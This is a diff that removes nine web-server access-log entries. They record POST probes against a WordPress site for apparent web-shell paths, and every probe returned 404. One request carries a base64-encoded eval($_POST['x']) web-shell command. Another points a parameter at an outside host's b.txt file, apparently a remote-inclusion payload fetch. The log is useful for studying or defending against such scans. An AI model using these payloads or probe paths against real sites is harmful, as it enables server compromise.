@@ -1,9 +1,0 @@
--	08:16:26	-0600	POST /wp-includes/js/dist/dist.php HTTP/1.1	404	23846	-	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36
--	08:16:26	-0600	POST /wp-includes/js/dist/dist.php HTTP/1.1	404	23846	-	Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0
--	08:36:27	-0600	POST /wp-admin/haccess.php?ev=ZXZhbCgkX1BPU1RbIngiXSk7 HTTP/1.1	404	23846	-	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36
--	09:36:53	-0600	POST /wp-includes/sodium_compat/src/Core/Core.php HTTP/1.1	404	23846	-	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36
--	09:47:24	-0600	POST /wp-admin/user/myk.php HTTP/1.1	404	23846	-	Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0
--	10:20:55	-0600	POST /wp-admin/ms-admin-wp.php?limit=152.89.196.13/b.txt HTTP/1.1	404	23846	-	Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0
--	10:26:23	-0600	POST /wp-content/themes/flatsome/inc/inc.php HTTP/1.1	404	23846	-	Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0
--	10:26:23	-0600	POST /wp-content/themes/twentynineteen/sass/sass.php HTTP/1.1	404	23846	-	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36
--	10:42:24	-0600	POST /wp-includes/js/js.php HTTP/1.1	404	23846	-	Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0
